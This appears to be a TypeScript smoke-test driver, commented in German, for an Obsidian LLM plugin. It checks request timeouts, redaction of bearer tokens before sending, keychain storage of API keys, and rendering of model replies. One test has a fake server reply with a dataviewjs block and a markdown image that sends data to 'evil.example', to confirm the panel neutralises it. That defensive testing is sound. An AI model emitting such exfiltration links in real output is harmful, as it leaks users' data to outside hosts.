/** F2 — Fristende: der Server sendet die Kopfzeilen und dann nie ein Byte. Die Fristen der Verbindung (Leerlauf 120 s,
 *  erstes Stueck 600 s) sind im Kit fest; der Treiber kuerzt sie im Renderer, indem `window.setTimeout` jede Frist
 *  ab 100 s auf 2 s zieht (die Uhr der Verbindung ruft `window.setTimeout`). Gemessen wird die Wirkung im Panel:
 *  faellt es nach Ablauf in `is-error` mit dem Knopf wieder auf „Tune“, oder bleibt „Tunt…“ stehen? */
async function pruefeFrist(cdp: Cdp): Promise<void> {
  console.log("\nF2 · Frist ohne Antwort → Panel");
  const NAME = "F2 Antwort bleibt nach dem Header aus: das Panel faellt nach der Frist in is-error, Knopf wieder Tune";
  const stub = await startLlmStub({ models: ["frist-model"], standard: { stille: true, model: "frist-model" } });
  const url = stub.url;
  let vorher: unknown = null;
  const patchZurueck = async (): Promise<void> => {
    await cdp.evaluate(`if (window.__smokeFristOrig) { window.setTimeout = window.__smokeFristOrig; delete window.__smokeFristOrig; } return { ok: true };`).catch(() => null);
  };
  const abmeldung = beimAbbruch(patchZurueck, "window.setTimeout nach F2 zuruecksetzen");
  try {
    vorher = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(url)}, model: "frist-model" }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    await cdp.evaluate(`
      if (!window.__smokeFristOrig) window.__smokeFristOrig = window.setTimeout;
      const orig = window.__smokeFristOrig;
      window.setTimeout = (fn, ms, ...rest) => orig.call(window, fn, typeof ms === "number" && ms >= 100000 ? 2000 : ms, ...rest);
      return { ok: true };
    `);
    await clickReal(cdp, `document.querySelector(".lt-run")`);
    const laeuft = await pollUntil<{ ok: boolean }>(cdp, `const b = document.querySelector(".lt-run"); return b && /Cancel|Abbrechen/.test(b.textContent) ? { ok: true } : null;`, 5000, 100);
    const fertig = await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && (s.classList.contains("is-ok") || s.classList.contains("is-error")) ? { ok: true } : null;`, 15_000, 250);
    const status = await text(cdp, ".lt-status");
    const knopf = await text(cdp, ".lt-run");
    const fehler = await hasClass(cdp, ".lt-status", "is-error");
    record(NAME, laeuft !== null && fertig !== null && fehler && knopf !== null && !/Cancel|Abbrechen/.test(knopf),
      `Lauf gestartet (Knopf = Abbrechen): ${laeuft !== null}, Status nach Frist ${JSON.stringify(status)}, is-error: ${fehler}, Knopf ${JSON.stringify(knopf)}, POSTs am Server: ${stub.zaehler().chat}`);
  } finally {
    await abmeldung.schliesse();
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        if (!p) return { ok: false };
        p.settings.endpoints = ${JSON.stringify(vorher)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        return { ok: true };
      `).catch(() => null);
    }
    await stub.stop();
  }
}

/** V — die Verbindung des Kits (0.51.2): Schwaerzung vor dem Senden, Schluesselbund, Neutralisierung.
 *  Ein eigener Fake-Server zeichnet auf, WAS auf den Draht ging (Body, Authorization), und spiegelt den
 *  Platzhalter, den er sah, in seine Antwort. Gemessen wird die Wirkung an drei Stellen: am Draht (V1), in
 *  `data.json` samt Header am Server (V2) und im gerenderten Panel (V3). */
async function pruefeVerbindung(cdp: Cdp): Promise<void> {
  console.log("\nV · Verbindung (Schwaerzung, Schluesselbund, Neutralisierung)");
  const NAMEN = [
    "V1 Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
    "V2 Schluessel steht nicht mehr in data.json, der Server bekommt ihn trotzdem",
    "V3 Antwort mit Code-Block-Prozessor und Bild rendert als Text",
  ];
  const GEHEIM = "smoke0123456789abcdefghij";
  const KEY = `sk-smoke-${Date.now().toString(36)}-0123456789`;
  let antwort: (user: string) => string = () => "ok";
  // Der Stub zeichnet auf, WAS auf den Draht ging (Body, Authorization); die Antwort spiegelt den Platzhalter, den er sah.
  const stub = await startLlmStub({
    models: ["v-model"],
    standard: { text: "ok", model: "v-model" },
    antwort: (anfrage) => {
      const msgs = (anfrage.json as { messages?: { role: string; content: string }[] } | null)?.messages ?? [];
      return { text: antwort(msgs.filter((m) => m.role === "user").map((m) => m.content).join("\n")), model: "v-model" };
    },
  });
  const gesehen = {
    get bodies(): string[] { return stub.anfragen().filter((a) => a.route === "chat").map((a) => a.body); },
    get auths(): string[] { return stub.anfragen().filter((a) => a.route === "chat").map((a) => String(a.header["authorization"] ?? "")); },
  };
  const url = stub.url;
  let vorher: unknown = null;
  const datei = ".obsidian/plugins/lingotuner/data.json";
  try {
    vorher = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
    // Ein Endpunkt MIT Schluessel im Klartext (ein Staging-Vault ohne Schluessel misst sonst nichts).
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(url)}, model: "v-model", apiKey: ${q(KEY)} }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve({ force: true });
      return { ok: true };
    `);
    const data = await pollUntil<{ text: string }>(cdp, `
      const t = await app.vault.adapter.read(${q(datei)});
      return t.includes(${q(KEY)}) ? null : { text: t };
    `, 8000, 250);

    // V1 — ueber die Plugin-API: ein Token in der Eingabe, der Server spiegelt, was er sah.
    antwort = (user) => `Gesehen: ${/\[redacted-[a-z0-9-]+-\d+\]/.exec(user)?.[0] ?? "KEIN-PLATZHALTER"}`;
    const r = await cdp.evaluate<{ ok: boolean; text: string }>(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      const r = await p.api.tune("Bitte kuerzen: Authorization: Bearer ${GEHEIM}", { directness: 0, context: 0, social: 2, semantics: 0 });
      return { ok: r.ok, text: r.ok ? r.text : "" };
    `);
    const drahtSauber = gesehen.bodies.length > 0 && gesehen.bodies.every((b) => !b.includes(GEHEIM)) && gesehen.bodies.some((b) => /\[redacted-[a-z0-9-]+-\d+\]/.test(b));
    record(NAMEN[0]!, r.ok && drahtSauber && r.text.includes(GEHEIM),
      `Server sah ${gesehen.bodies.length} Anfrage(n), Original im Body: ${gesehen.bodies.some((b) => b.includes(GEHEIM))}, Platzhalter da: ${drahtSauber}, Ergebnis ${JSON.stringify(r.text.slice(0, 60))}`);

    // V2 — Schluesselbund: kein Klartext in data.json, der Header am Server traegt ihn trotzdem.
    const hatId = data !== null && /"secretId"/.test(data.text);
    record(NAMEN[1]!, data !== null && !data.text.includes(KEY) && hatId && gesehen.auths.some((a) => a === `Bearer ${KEY}`),
      `data.json ${data === null ? "traegt den Klartext noch" : "ohne Klartext"}, secretId ${hatId ? "da" : "FEHLT"}, Authorization am Server ${gesehen.auths.some((a) => a === `Bearer ${KEY}`) ? "ok" : `FEHLT (${JSON.stringify(gesehen.auths.map((a) => a.slice(0, 16)))})`}`);

    // V3 — Panel-Lauf: die Antwort traegt einen Code-Block-Prozessor und ein Bild.
    antwort = () => "```dataviewjs\ndv.paragraph('x')\n```\n\n![x](https://evil.example/?d=geheim)";
    const ok = await laufeTune(cdp);
    const dom = await cdp.evaluate<{ img: number; pre: number; text: string }>(`
      const b = document.querySelector(".okit-stream-body");
      return { img: b ? b.querySelectorAll("img").length : -1, pre: b ? b.querySelectorAll("pre").length : -1, text: b ? b.textContent : "" };
    `);
    record(NAMEN[2]!, ok && dom.img === 0 && dom.pre === 0 && /dataviewjs/.test(dom.text),
      ok ? `img ${dom.img}, pre ${dom.pre}, Text zeigt „dataviewjs“: ${/dataviewjs/.test(dom.text)}` : `Lauf fehlgeschlagen (${(await text(cdp, ".lt-status")) ?? "?"})`);
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        if (!p) return { ok: false };
        p.settings.endpoints = ${JSON.stringify(vorher)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        return { ok: true };
      `).catch(() => null);
    }
    await stub.stop();
  }
}

async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
  console.log('\nN · Abschnitt "Anfrage" (Sampling-Profile)');
  let stelle: SettingsStelle | null = null;
  const NAMEN = [
    "N1 Abschnitt Anfrage laesst sich aufklappen",
    "N2 Eigener Wert wird gesetzt und wieder zurueckgesetzt",
    "N3 Denk-Knopf im Panel schaltet um",
    "N4 Stufenwahl im Chat zeigt ein Dropdown",
  ];
  try {
    stelle = await openSettings(cdp, port);
    // N1 — Header per Titeltext finden (De/En, je nach Sprache des Vaults), klicken, Body
    // verliert is-collapsed.
    const geklappt = await stelle.cdp.evaluate<{ textDa: boolean; ok: boolean }>(`return ${stelle.el(`(() => {
      const header = [...root.querySelectorAll(".okit-collapsible-header")].find((h) => /Anfrage|Request/.test(h.textContent || ""));
      if (!header) return { textDa: false, ok: false };
      header.click();
      const body = header.closest(".okit-collapsible").querySelector(".okit-collapsible-body");
      return { textDa: true, ok: !!body && !body.classList.contains("is-collapsed") };
    })()`)};`);
    record(NAMEN[0]!, geklappt.textDa && geklappt.ok,
      geklappt.textDa ? `aufgeklappt=${geklappt.ok}` : "kein .okit-collapsible-header mit 'Anfrage'/'Request' gefunden");

    if (geklappt.textDa && geklappt.ok) {
      // N2 — Temperatur-Feld ueberschreiben (blur loest das Speichern aus), pruefen, dass es
      // als eigener Wert markiert ist, dann per Zuruecksetzen-Knopf (Extra-Button) aufheben.
      const gesetzt = await stelle.cdp.evaluate<{ own: boolean; zurueck: boolean }>(`return ${stelle.el(`(async () => {
        const input = root.querySelector('input[data-field="temperature"]');
        if (!input) return { own: false, zurueck: false };
        input.value = "0.9";
        input.dispatchEvent(new Event("blur"));
        await new Promise((r) => setTimeout(r, 300));
        const nachInput = root.querySelector('input[data-field="temperature"]');
        const own = !!nachInput && nachInput.classList.contains("okit-request-own");
        const item = nachInput ? nachInput.closest(".setting-item") : null;
        const resetBtn = item ? item.querySelector(".clickable-icon") : null;
        if (resetBtn) resetBtn.click();
        await new Promise((r) => setTimeout(r, 300));
        const nachReset = root.querySelector('input[data-field="temperature"]');
        const zurueck = !!nachReset && !nachReset.classList.contains("okit-request-own");
        return { own, zurueck };
      })()`)};`);
      record(NAMEN[1]!, gesetzt.own && gesetzt.zurueck, `eigener Wert gesetzt=${gesetzt.own}, zurueckgesetzt=${gesetzt.zurueck}`);
    } else {
      nichtGemessen(NAMEN[1]!, "Abschnitt liess sich nicht aufklappen — ohne ihn ist kein Feld erreichbar");
    }
    await closeSettings(cdp, stelle);
    stelle = null;

    // N3 — Denk-Knopf im Panel: ein Klick schaltet is-off um.
    const vor = await hasClass(cdp, ".okit-thinking-toggle", "is-off");
    await clickReal(cdp, `document.querySelector(".okit-thinking-toggle")`).catch(() => undefined);
    await new Promise((r) => { setTimeout(r, 300); });
    const nach = await hasClass(cdp, ".okit-thinking-toggle", "is-off");
    record(NAMEN[2]!, vor !== nach, `is-off vorher=${vor}, nachher=${nach}`);
    if (vor !== nach) await clickReal(cdp, `document.querySelector(".okit-thinking-toggle")`).catch(() => undefined); // zurueck

    // N4 — "Stufenwahl im Chat" einschalten (direkt in den Settings, kein Umweg ueber einen
    // zweiten Settings-Aufruf) und das Panel selbst neu zeichnen lassen (`refresh()`, das
    // Kit-Muster fuer Aenderungen von aussen) — danach steht ein <select> statt des Knopfs.
    const dropdown = await cdp.evaluate<{ vorher: boolean; nachher: boolean }>(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      const vorher = !!document.querySelector(".okit-thinking-control select");
      p.settings.request.levelPickerInChat = true;
      await p.saveSettings();
      const leaf = app.workspace.getLeavesOfType(${q(VIEW_TYPE)})[0];
      if (leaf && leaf.view && leaf.view.refresh) leaf.view.refresh();
      await new Promise((r) => setTimeout(r, 300));
      const nachher = !!document.querySelector(".okit-thinking-control select");
      return { vorher, nachher };
    `);
    record(NAMEN[3]!, !dropdown.vorher && dropdown.nachher, `Dropdown vorher=${dropdown.vorher}, nachher=${dropdown.nachher}`);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.request.levelPickerInChat = false;
      await p.saveSettings();
      const leaf = app.workspace.getLeavesOfType(${q(VIEW_TYPE)})[0];
      if (leaf && leaf.view && leaf.view.refresh) leaf.view.refresh();
      return { ok: true };
    `).catch(() => undefined);
  } catch (e) {
    for (const n of NAMEN) {
      if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
    }
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
  }
}

async function main(): Promise<void> {
  const argv = process.argv.slice(2);
  if (parseArgs(argv).has("--setup")) { setupVault(); return; }
  const args = parseArgs(argv);
  const port = Number(args.value("port"));
  if (!Number.isInteger(port) || port < 1024 || port > 65535) {
    throw new Error("--port <1024-65535> ist Pflicht (Port deiner Zweitinstanz, vom Lock gehalten) — es gibt keinen Standardport.");
  }
  const vaultFilter = args.value("vault") ?? REPO_NAME;
  MODELL_FLAG = args.value("model");
  if (args.value("stub-laenge") === "kurz") STUB_LAENGE = "kurz";
  if (args.value("stub-stuecke") === "absatz") STUB_STUECKE = "absatz";

  const cdp = await attachTo("workspace", port, vaultFilter);
  if (!cdp) throw new Error(`Kein Obsidian-Fenster fuer Vault "${vaultFilter}" auf Port ${port}.`);
  const warnungen: string[] = [];
  // CORE-TEST-21: der Manager-Slot gehoert nach dem Lauf wieder so, wie er davor war (Fake-Manager zentral und lokal, auch bei Abbruch).
  const slotZustand = async (): Promise<string> => (await cdp.evaluate<{ s: string }>(`const m = app.plugins.plugins[${q(MANAGER_PLUGIN_ID)}]; return { s: !m ? "keiner" : m.__fakeManager || m.api?.__fakeManager ? "fake" : "echt" };`)).s;
  const slotVorher = await slotZustand();
  // Abbruch (Welle 21): ein Schritt fuer alles, was der Lauf im Wirt anlegt — Plugin-Einstellungen (Endpunkte, Wahl, Regler,
  // Logbuch, Denken) und der Manager-Slot. Idempotent (Normalweg im finally UND Ctrl-C), wartet nicht. Angemeldet VOR der ersten
  // Mutation; `einstellungenVorher` ist bis dahin `null`, dann gibt es auch noch nichts zurueckzuschreiben.
  const zustandZurueck = async (): Promise<void> => {
    await entferneFakeManager(cdp, { pluginId: MANAGER_PLUGIN_ID }).catch(() => null);
    if (einstellungenVorher === null) return;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      if (!p) return { ok: false };
      const vorher = JSON.parse(${q(einstellungenVorher)});
      for (const k of Object.keys(p.settings)) if (!(k in vorher)) delete p.settings[k];
      Object.assign(p.settings, vorher);
      await p.saveSettings();
      return { ok: true };
    `).catch(() => null);
  };
  const zustand = beimAbbruch(zustandZurueck, "Plugin-Einstellungen und Manager-Slot zuruecksetzen");
  try {
    await cdp.mitschnitt((z) => { if (/error|exception/i.test(z)) warnungen.push(`Renderer: ${z}`); });
    await requireVisible(cdp);
    const v = (await cdp.evaluate<{ name: string; basePath: string; configDir: string }>(`return { name: app.vault.getName(), basePath: app.vault.adapter.basePath, configDir: app.vault.configDir };`));
    console.log(`Vault: ${v.name} (${v.basePath})`);
    requireEigenerBuild(join(v.basePath, v.configDir, "plugins", PLUGIN_ID, "main.js"), join(REPO_ROOT, "main.js"), (m) => warnungen.push(m));

    await pruefeGrundlage(cdp, v.name);
    await pruefePanel(cdp);
    await pruefeLauf(cdp);
    await pruefeManager(cdp, port);
    await pruefeApple(cdp, port);
    await pruefeHilfeZeile(cdp, port);
    await pruefeLab(cdp);
    await pruefeFallback(cdp);
    await pruefeFrist(cdp);
    await pruefeVerbindung(cdp);
    await pruefeAnfrage(cdp, port);
    await pruefeRundenZeile(cdp);
    await pruefeRueckwahl(cdp);
    await pruefeGemma(cdp);
    await pruefeClaude(cdp, port);
    await pruefeGlobalesModell(cdp, port);
    skipped("Markierung ersetzen (Rand-Whitespace)", "Editor-Selektion per CDP ist im Unit-Test abgedeckt (editor-io.test.ts); im Smoke muesste sie ueber CodeMirror gesetzt werden — Handarbeit");
  } finally {
    await zustand.schliesse();
    if (istAbgebrochen()) return;
    const slotNachher = await slotZustand().catch(() => "unlesbar");
    console.log(`Fake-Manager-Abbau: Slot vorher ${slotVorher}, nachher ${slotNachher}`);
    if (slotNachher !== slotVorher) { warnungen.push(`Manager-Slot nach dem Lauf nicht wiederhergestellt: vorher ${slotVorher}, nachher ${slotNachher}`); process.exitCode = 1; }
    const n = await closeExtraLeaves(cdp).catch(() => 0);
    console.log(`\nAufgeraeumt: ${n} zusaetzliche Leaves geschlossen. Notices: ${await notices(cdp).catch(() => "?")}`);
    cdp.close();
  }
  bilanz.abschluss();
  for (const w of warnungen) console.log(`WARNUNG: ${w}`);
}

runDriver(main);
